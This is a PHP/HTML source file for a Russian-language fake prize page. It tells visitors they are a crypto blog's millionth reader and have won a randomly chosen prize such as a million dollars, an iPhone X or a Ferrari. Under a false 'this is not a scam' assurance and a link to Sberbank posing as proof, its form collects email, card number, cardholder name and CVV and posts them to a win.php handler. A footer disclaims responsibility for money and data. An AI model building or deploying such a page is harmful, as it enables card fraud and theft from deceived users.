<?php
$prizes_var = [["миллион долларов", "миллиона долларов", "миллион.jpg"], ["еду в макдональдсе", "еды в макдональдсе", "еда.jpg"],
["Iphone X", "iphone X", "iphone.jpg"], ["Samsung S8", "samsung S8", "samsung.jpg"], ["АААвтомобиль", "aвтомобиля Ferari", "ferrari.jpg"],
["Остров", "острова", "остров.jpg"], ["Круиз на Титанике", "круиза на Титанике", "круиз.jpg"]];
$prize = $prizes_var[rand(0,count($prizes_var)-1)];

?>

<title>Ваш шанс!!!</title>

<link rel="stylesheet" href = "./my.css" >
<div class = "header">
<h1>У вас есть шанс получить <?php echo $prize[0]; ?>!!!!</h1>
<h2>Пожалуйста, дочитайте до конца, ведь больше такого шанса не выпадет</h2>
<h2><em>Чтобы получить <?php echo $prize[0]; ?> надо всего лишь заполнить информацию снизу!<em></h2>
</div>
<a href = "javascript:sh()"><h3>Подробнее</h3></a><br>
<div class = "about" id = "ab">
  <h4><img src = "news.png" height = "80px" align = "right">Здраствуйте, вы - миллионный посетитель моего блогa.
    Это НЕ развод, я просто хочу поощерить моих любимых пользователей.</h4>
  <h4><img src = "bitcoin.png" height = "80px" align = "left">Вы на протяжении значительного периода времени читали мой криптовалютный блог.
    И вот наконец случилось! ВЫ мой миллионный пользователь. Я не знаю кто вы, и чем вы занимаетесь, но как и обещал
    <a href = "https://www.google.ru/search?q=22+сентября+2017+года&ie=UTF-8"> 22 сентября 2017 года</a>
    я отдаю 1 000 000 пользователю миллион рублей.</h4>
  <h4>Как мы все помним я намайнил 1500 биткоинов в 2009 году, что позаоляет сейчас жить без забот.
  Я решил поделиться своим методом успеха с другими пользователями. И вот вы миллионный посититель моего блога.
  И мой подарок вам - это <b><?php echo $prize[0]; ?>!</b></h4>
  <h5>Есть только одно неудачное обстоятельство(но оно же не станет для нас помехой?).
    Мне потребуются данные вашей карточка для авторизации(возможно до вас половина поситителей - боты, которые жаждут получить заветный приз).
    Поэтому мы снимем небольшую сумму, а потом вернем её. Не волнуйтесь, это стандартная операция, вы можете почитать об этом на
    <a href = "https://www.sberbank.ru/ru/">официальном сайте Сбербанка</a>. Потом мы вернем вам сумму в полном размере и свяжемся
    по вашей почте для получения <b><?php echo $prize[1]; ?>!</b>.</h5>
</div>
<img src = "<?php echo $prize[2]?>" height = "400px" id = "preview">
<script type = "text/javascript">
sh();
function sh(){
  obj = document.getElementById("ab");
  if(obj.style.display === "none"){obj.style.display = "block";} else {obj.style.display = "none"}
}

</script>
<form action = '/win.php?pr=<?php echo $prize[0]; ?>' method = "POST">
  <table  class = "add_your_inf">
    <tr>
      <th colspan = "2"><h3> Заполните информацию:  <h3></th>
    </tr>
    <tr>
      <td><p><b>Mail: </b></p></td>
      <td><input type = "text" name = "mail"/></td>
    </tr>
    <tr>
      <td><p><b>Card number: </b></p></td>
      <td><input type = "text" name = "num"/></td>
    </tr>
    <tr>
      <td><p><b>User name: </b></p></td>
      <td><input type = "text" name = "name"/></td>
    </tr>
    <tr>
      <td><p><b>CVS: </b></p></td>
      <td><input type = "text" name = "cvs"/></td>
    </tr>
    <tr>
      <td colspan = "2"><input type = "submit" value = "Я готов забрать приз"></td>
    <tr>
  </table>
</form>





<p class = "main_inf">за деньги ответственность не несем, как и за сохранность личных данных</p>
